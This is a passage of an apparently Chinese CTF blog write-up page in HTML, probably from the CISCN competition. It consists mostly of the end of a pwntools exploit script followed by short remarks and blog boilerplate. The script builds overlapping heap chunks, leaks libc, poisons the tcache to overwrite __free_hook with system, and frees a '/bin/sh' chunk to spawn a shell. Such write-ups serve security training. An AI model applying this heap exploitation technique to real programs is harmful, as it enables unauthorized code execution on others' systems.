+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         new_func()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     except (EOFError):</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#         gift.io = copy_current_io()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	upload(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;b&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">0x470</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;b&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x470</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x80</span>, flat([
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;c&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x78</span>, <span style="color:#bd93f9">0x101</span>
+</span></span><span style="display:flex;"><span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># release overlap chunk</span>
+</span></span><span style="display:flex;"><span>release(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># alloc</span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">0xf0</span>, flat([
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x481</span>
+</span></span><span style="display:flex;"><span>])<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0xf0</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># alloc a tcache</span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;d&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>release(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>release(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># leak</span>
+</span></span><span style="display:flex;"><span>download(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>r(<span style="color:#bd93f9">0x80</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># leak libc</span>
+</span></span><span style="display:flex;"><span>leak_libc <span style="color:#ff79c6">=</span> u64(r(<span style="color:#bd93f9">8</span>))
+</span></span><span style="display:flex;"><span>log2_ex(<span style="color:#8be9fd;font-style:italic">hex</span>(leak_libc))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff79c6">=</span> leak_libc <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x71895895dbe0</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x718958771000</span>
+</span></span><span style="display:flex;"><span>log2_ex(<span style="color:#8be9fd;font-style:italic">hex</span>(libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># now try to hijack tcache fd</span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">6</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">9</span>, <span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x70</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">7</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># put chunk 9 to tcache</span>
+</span></span><span style="display:flex;"><span>release(<span style="color:#bd93f9">9</span>)
+</span></span><span style="display:flex;"><span>release(<span style="color:#bd93f9">8</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># overflow in chunk 8</span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">0x88</span>, flat([
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;c&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x78</span>, <span style="color:#bd93f9">0x81</span>,
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;__free_hook&#39;</span>]
+</span></span><span style="display:flex;"><span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># free hook hijack</span>
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">10</span>, <span style="color:#bd93f9">0x70</span>, flat([
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>
+</span></span><span style="display:flex;"><span>])<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span>upload(<span style="color:#bd93f9">11</span>, <span style="color:#bd93f9">0x70</span>, flat([
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;system&#39;</span>]
+</span></span><span style="display:flex;"><span>])<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">0x70</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>release(<span style="color:#bd93f9">10</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>修复很迷，hxd修了一天都没修出来。。</p>
+<h1 id="吐槽">吐槽</h1>
+<ol>
+<li>
+<p>靶场真的卡，我直到9.30才进去。</p>
+</li>
+<li>
+<p>居然卡到需要后台管理手动SQL上分 [○･｀Д´･ ○]</p>
+</li>
+</ol>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/ciscn2025/" data-toggle="tooltip" data-placement="top" title="2025长城杯&amp;CISCN半决赛复盘">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/course" title="course">
+                            course
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/crypto" title="crypto">
+                            crypto
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/life" title="life">
+                            life
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/notebook" title="notebook">
+                            notebook
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/writeup" title="writeup">
+                            writeup
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%A0" title="统计学习">
+                            统计学习
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2025
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
